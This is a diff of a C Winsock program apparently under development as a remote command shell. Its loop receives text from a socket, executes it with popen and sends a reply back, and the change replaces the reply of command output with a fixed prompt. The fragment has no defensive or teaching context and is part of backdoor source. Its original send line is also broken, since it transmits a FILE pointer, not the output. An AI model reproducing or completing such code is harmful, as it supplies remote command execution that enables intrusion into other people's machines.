@@ -9,7 +9,7 @@
 
 
 int main() {
-  char prompt[15] = "Connected...";
+  char prompt[15] = "Connected...\n";
 
   // Initialize Winsock and use version 2.2
   WSADATA wsaData;
@@ -38,7 +38,9 @@ int main() {
     //send_prompt(ConnectSocket);
     res = recv( ConnectSocket, buf, BUF_LEN, 0 );
     output = popen(buf, "r");
-    send( ConnectSocket, (char *)output, sizeof(output), 0);
+    send( ConnectSocket, prompt, sizeof(prompt), 0);
+
+    //send( ConnectSocket, (char *)output, sizeof(output), 0);
     pclose(output);
   } while (1 == 1);
 
